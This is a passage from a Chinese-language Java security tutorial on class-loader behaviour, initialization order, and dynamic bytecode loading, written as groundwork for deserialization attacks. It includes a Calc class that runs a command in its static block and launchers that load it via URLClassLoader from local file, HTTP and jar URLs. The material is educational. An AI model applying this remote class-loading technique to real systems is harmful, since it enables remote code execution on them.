class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;  <br>  <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello&quot;</span>;  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();  <br><span class="hljs-comment">//利用反射打印出加载器  </span><br> System.out.println(student.getClass().getClassLoader());  <br> System.out.println(student.toString());  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a31.png"></p><p>可以看到此时调用的是App类加载器</p><h2 id="各场景下代码块加载顺序"><a href="#各场景下代码块加载顺序" class="headerlink" title="各场景下代码块加载顺序"></a>各场景下代码块加载顺序</h2><ul><li>这里的代码块主要指的是这四种<ul><li>静态代码块：<code>static&#123;&#125;</code></li><li>构造代码块：<code>&#123;&#125;</code></li><li>无参构造器：<code>ClassName()</code></li><li>有参构造器：<code>ClassName(String name)</code></li></ul></li></ul><h3 id="场景一、实例化对象"><a href="#场景一、实例化对象" class="headerlink" title="场景一、实例化对象"></a>场景一、实例化对象</h3><p>这里有两个文件，分别介绍一下用途：</p><ul><li><code>Person.java</code>：一个普普通通的类，里面有静态代码块、构造代码块、无参构造器、有参构造器、静态成员变量、普通成员变量、静态方法。</li><li><code>Main.java</code>：启动类</li></ul><p><strong>Person.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader;  <br>  <br><span class="hljs-comment">// 存放代码块  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> staticVar;  <br> <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> instanceVar;  <br>  <br> <span class="hljs-keyword">static</span> &#123;  <br>        System.out.println(<span class="hljs-string">&quot;静态代码块&quot;</span>);  <br> &#125;  <br>  <br>    &#123;  <br>        System.out.println(<span class="hljs-string">&quot;构造代码块&quot;</span>);  <br> &#125;  <br>  <br>    Person()&#123;  <br>        System.out.println(<span class="hljs-string">&quot;无参构造器&quot;</span>);  <br> &#125;  <br>    Person(<span class="hljs-type">int</span> instanceVar)&#123;  <br>        System.out.println(<span class="hljs-string">&quot;有参构造器&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">staticAction</span><span class="hljs-params">()</span>&#123;  <br>        System.out.println(<span class="hljs-string">&quot;静态方法&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Main.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader;  <br>  <br><span class="hljs-comment">// 代码块的启动器  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>结论：</strong></li></ul><p>通过 <code>new</code> 关键字实例化的对象，先调用<strong>静态代码块</strong>，然后调用<strong>构造代码块</strong>，最后根据实例化方式不同(对应参数列表不同)，调用不同的构造器。</p><h3 id="场景二、调用静态方法"><a href="#场景二、调用静态方法" class="headerlink" title="场景二、调用静态方法"></a>场景二、调用静态方法</h3><p>直接调用类的静态方法</p><p>Person.java 不变，修改 Main.java 启动器即可。</p><p><strong>Main.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> src.DynamicClassLoader;  <br>  <br><span class="hljs-comment">// 代码块的启动器  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        Person.staticAction();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>结论：</strong></li></ul><p>不实例化对象直接调用静态方法，会先调用类中的<strong>静态代码块</strong>，然后调用<strong>静态方法</strong></p><h3 id="场景三、对类中的静态成员变量赋值"><a href="#场景三、对类中的静态成员变量赋值" class="headerlink" title="场景三、对类中的静态成员变量赋值"></a>场景三、对类中的静态成员变量赋值</h3><p><strong>Main.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader;  <br>  <br><span class="hljs-comment">// 代码块的启动器  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br> Person.staticVar = <span class="hljs-number">1</span>;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>结论：</strong></li></ul><p>在对静态成员变量赋值前，会调用<strong>静态代码块</strong></p><h3 id="场景四、使用-class-获取类"><a href="#场景四、使用-class-获取类" class="headerlink" title="场景四、使用 class 获取类"></a>场景四、使用 class 获取类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader;  <br>  <br><span class="hljs-comment">// 代码块的启动器  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Person.class;  <br> &#125;  <br>&#125;<br><br><span class="hljs-comment">// 无输出</span><br></code></pre></td></tr></table></figure><ul><li><strong>结论：</strong></li></ul><p>利用 <code>class</code> 关键字获取类，并不会加载类，也就是什么也不会输出。</p><h3 id="场景五、使用-forName-获取类"><a href="#场景五、使用-forName-获取类" class="headerlink" title="场景五、使用 forName 获取类"></a>场景五、使用 forName 获取类</h3><ul><li>这里要抛出异常一下。</li></ul><p>我们写三种 <code>forName</code> 的方法调用。<br>修改 <strong>Main.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader;  <br>  <br><span class="hljs-comment">// 代码块的启动器  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException&#123;  <br> Class.forName(<span class="hljs-string">&quot;src.DynamicClassLoader.Person&quot;</span>);<br> &#125;  <br>&#125;<br><span class="hljs-comment">// 静态代码块</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader;  <br>  <br><span class="hljs-comment">// 代码块的启动器  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException&#123;   <br> Class.forName(<span class="hljs-string">&quot;src.DynamicClassLoader.Person&quot;</span>, <span class="hljs-literal">true</span>, ClassLoader.getSystemClassLoader());  <br> &#125;  <br>&#125;<br><span class="hljs-comment">// 静态代码块</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader;  <br>  <br><span class="hljs-comment">// 代码块的启动器  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException&#123;   <br> Class.forName(<span class="hljs-string">&quot;src.DynamicClassLoader.Person&quot;</span>, <span class="hljs-literal">false</span>, ClassLoader.getSystemClassLoader());<br> &#125;  <br>&#125;<br><span class="hljs-comment">//没有输出</span><br></code></pre></td></tr></table></figure><ul><li><strong>结论：</strong></li></ul><p><code>Class.forName(className)</code>和<code>Class.forName(className, true, ClassLoader.getSystemClassLoader())</code>等价，这两个方法都会调用类中的<strong>静态代码块</strong>，如果将第二个参数设置为<code>false</code>，那么就不会调用<strong>静态代码块</strong></p><p>第二个参数是initialize，控制类的初始化。初始化类就会执行静态代码块</p><h3 id="场景六、使用-ClassLoader-loadClass-获取类"><a href="#场景六、使用-ClassLoader-loadClass-获取类" class="headerlink" title="场景六、使用 ClassLoader.loadClass() 获取类"></a>场景六、使用 ClassLoader.loadClass() 获取类</h3><p><strong>Main.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;     <br>        ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;src.DynamicClassLoader.Person&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//没有输出</span><br></code></pre></td></tr></table></figure><ul><li><strong>结论：</strong></li></ul><p><code>ClassLoader.loadClass()</code>方法只加载，不初始化，当然，如果后面再使用<code>newInstance()</code>进行初始化，那么会和<code>场景一、实例化对象</code>一样的顺序加载对应的代码块。</p><h2 id="动态加载字节码"><a href="#动态加载字节码" class="headerlink" title="动态加载字节码"></a>动态加载字节码</h2><h3 id="字节码的概念"><a href="#字节码的概念" class="headerlink" title="字节码的概念"></a>字节码的概念</h3><p>什么是字节码？</p><blockquote><p>严格来说，Java 字节码（ByteCode）其实仅仅指的是 Java 虚拟机执行使用的一类指令，通常被存储在 .class 文件中。</p></blockquote><p>而字节码的诞生是为了让 JVM 的流通性更强，这是什么意思呢？看图便知。</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a32.png"></p><p><strong>字节码是中间层</strong>：屏蔽了不同语言和不同操作系统的差异。</p><p><strong>JVM 是执行引擎</strong>：它只要能读懂字节码，就能跑在 Windows、Linux、Mac、甚至手机（Android）上。</p><p>因为这种模式，JVM 不仅能跑 Java，还能跑 Kotlin、Scala、Groovy 等一大堆语言 → <strong>JVM 变成了一个“多语言运行平台”</strong>。</p><h3 id="类加载器的原理"><a href="#类加载器的原理" class="headerlink" title="类加载器的原理"></a>类加载器的原理</h3><p>根据前面各场景下代码块的加载顺序我们得知，在 loadClass() 方法被调用的时候，是不进行类的初始化的。</p><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();  <br>c.loadClass(<span class="hljs-string">&quot;BasiClassLoader.Person&quot;</span>);<br></code></pre></td></tr></table></figure><p>打一下断点，调试一下，断点打在 <code>ClassLoader.loadClass()</code> 的地方，也就是父类。为什么这么打断点是有原因的，因为最开始我们已知 “Person” 类它是 <code>Launcher@APPClassLoader</code>，它里面是有一个 <code>loadClass()</code> 方法的，但是它只有一个参数。所以断点下在 <code>ClassLoader.loadClass()</code> 之类</p><p>开始调试</p><p>调试先会走到 <code>ClassLoader.loadClass()</code>，这里其实 return 就多给了一个参数为 false；我们 ctrl + f7 跟进。又会回到 <code>Launcher@APPClassLoader</code> 这里。</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a33.png"></p><p>而在 <code>java.lang.ClassLoader</code> 中，<code>loadClass</code> 方法的定义是这样的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="hljs-type">boolean</span> resolve) <span class="hljs-keyword">throws</span> ClassNotFoundException<br></code></pre></td></tr></table></figure><p><code>resolve</code>（布尔值，可选）<br> 是否在加载后**立即解析（link&#x2F;resolve）**类。</p><ul><li><code>false</code>：只加载类，但不解析。</li><li><code>true</code>：加载后立刻解析。</li></ul><p>这里return false，所以类不会初始化</p><p>继续跟进</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a34.png"></p><p>这里 null 是因为最上面的 Bootstrap 类是 native 类，也就是之前说过的 C 写的源码，所以为 null。</p><p>继续往下走，因为 APP 和 Ext 的父类是 URLClassLoader，所以这里的 findClass() 是会去找到 URLClassLoader 的。</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a35.png"></p><p>接着在 URLClassLoader 里面调用了 defineClass 方法，再一步步跟进就是我们的 native 方法(在 JVM 内部做的事情：字节码验证，生成 JVM 内部数据结构（Klass），链接（验证 + 准备 + 解析），存入方法区&#x2F;元空间)</p><p>总的流程:<br>ClassLoader —-&gt; SecureClassLoader —&gt; URLClassLoader —-&gt; APPClassLoader —-&gt; loadClass() —-&gt; findClass()</p><p>下面我们介绍多种能够用于反序列化攻击的，加载字节码的类加载器。</p><h3 id="利用-URLClassLoader-加载远程-class-文件"><a href="#利用-URLClassLoader-加载远程-class-文件" class="headerlink" title="利用 URLClassLoader 加载远程 class 文件"></a>利用 URLClassLoader 加载远程 class 文件</h3><p><code>URLClassLoader</code> 实际上是我们平时默认使用的 <code>AppClassLoader</code> 的父类，所以，我们解释 <code>URLClassLoader</code> 的工作过程实际上就是在解释默认的 <code>Java </code>类加载器的工作流程。</p><p>正常情况下，Java会根据配置项 <code>sun.boot.class.path</code> 和 <code>java.class.path</code> 中列举到的基础路径（这些路径是经过处理后的 <code>java.net.URL</code> 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：</p><p>①：URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 <code>JarLoader</code> 来寻找类，即为在Jar包中寻找.class文件</p><p>②：URL以斜杠 &#x2F; 结尾，且协议名是 <code>file</code> ，则使用 <code>FileLoader</code> 来寻找类，即为在本地文件系统中寻找.class文件</p><p>③：URL以斜杠 &#x2F; 结尾，且协议名不是 <code>file</code> ，则使用最基础的 <code>Loader</code> 来寻找类。</p><p>我们一个个看</p><h4 id="file-协议"><a href="#file-协议" class="headerlink" title="file 协议"></a>file 协议</h4><p>我们在目录下新建一个 Calc.java 的文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;  <br>  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br>  <br><span class="hljs-comment">// URLClassLoader 的 file 协议  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;  <br>    <span class="hljs-keyword">static</span> &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);  <br> &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>            e.printStackTrace();  <br> &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>这里利用终端进行编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac Calc.java<br></code></pre></td></tr></table></figure><p>可以看到当前目录下生成Calc.class文件</p><p>接着，我们编写 URLClassLoader 的启动类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.URLClassLoader;<br><br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-comment">// URLClassLoader 的 file 协议</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span><br>                (<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;file:///D:\\javaEE练习\\src\\src\\main\\java\\src&quot;</span>)&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;src.Calc&quot;</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a36.png"></p><h4 id="HTTP-协议"><a href="#HTTP-协议" class="headerlink" title="HTTP 协议"></a>HTTP 协议</h4><p>在 <code>Calc.class</code> 文件目录下执行 <code>python3 -m http.server 9999</code>，起一个 http 服务。</p><p>接着，我们编写恶意利用类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.URLClassLoader;<br><br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-comment">// URLClassLoader 的 HTTP 协议</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HTTPRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:9999&quot;</span>)&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;src.Calc&quot;</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a37.png"></p><h4 id="file-jar-协议"><a href="#file-jar-协议" class="headerlink" title="file+jar 协议"></a>file+jar 协议</h4><p>先将我们之前的 class 文件打包一下，打包为 jar 文件。</p><p>去到源 .class 文件下，别去复制的地方，运行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">jar -cvf Calc.jar Clac.class<br></code></pre></td></tr></table></figure><p>接着，我们修改启动器，调用恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.URLClassLoader;<br><br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JarRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;jar:file:///E:\\Calc.jar!/&quot;</span>)&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;src.Calc&quot;</span>);<br>        calc.newInstance();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a38.png"></p><h4 id="HTTP-jar-协议"><a href="#HTTP-jar-协议" class="headerlink" title="HTTP + jar 协议"></a>HTTP + jar 协议</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.DynamicClassLoader.URLClassLoader;  <br>  <br><span class="hljs-keyword">import</span> java.net.URL;  <br><span class="hljs-keyword">import</span> java.net.URLClassLoader;  <br>  <br><span class="hljs-comment">// URLClassLoader 的 HTTP + jarpublic class HTTPJarRce &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;jar:http://127.0.0.1:9999/Calc.jar!/&quot;</span>)&#125;);  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;src.Calc&quot;</span>);  <br> calc.newInstance();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a39.png"></p><p>最灵活的肯定是 http 协议的加载</p><h3 id="利用-ClassLoader-defineClass-直接加载字节码"><a href="#利用-ClassLoader-defineClass-直接加载字节码" class="headerlink" title="利用 ClassLoader#defineClass 直接加载字节码"></a>利用 ClassLoader#defineClass 直接加载字节码</h3><p>不管是加载远程 class 文件，还是本地的 class 或 jar 文件，Java 都经历的是下面这三个方法调用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">URLClassLoader.loadClass()<br>    ↓<br>findClass()<br>    ↓<br>URLClassPath -&gt; 打开 URL（file/http/ftp）<br>    ↓<br>读取字节码<br>    ↓<br>ClassLoader.defineClass() (native)<br>    ↓<br>得到 JVM 内部 Class 对象<br></code></pre></td></tr></table></figure><p>从前面的分析可知：</p><ul><li><code>loadClass()</code> 的作用是从已加载的类、父加载器位置寻找类（即双亲委派机制），在前面没有找到的情况下，调用当前ClassLoader的<code>findClass()</code>方法；</li><li><code>findClass()</code> 根据URL指定的方式来加载类的字节码，其中会调用<code>defineClass()</code>；</li><li><code>defineClass</code> 的作用是处理前面传入的字节码，将其处理成真正的 Java 类<br>所以可见，真正核心的部分其实是 defineClass ，他决定了如何将一段字节流转变成一个Java类，Java</li></ul><p>默认的 <code>ClassLoader#defineClass</code> 是一个 native 方法，逻辑在 JVM 的C语言代码中。</p><p> <code>DefineClass</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="hljs-type">byte</span>[] b, <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len)<br>       <span class="hljs-keyword">throws</span> ClassFormatError<br>   &#123;<br>       <span class="hljs-keyword">return</span> defineClass(name, b, off, len, <span class="hljs-literal">null</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><p><code>name</code>为类名，<code>b</code>为字节码数组，<code>off</code>为偏移量，<code>len</code>为字节码数组的长度。</p><p>因为系统的 ClassLoader#defineClass 是一个保护属性，所以我们无法直接在外部访问。因此可以反射调用 <code>defineClass()</code> 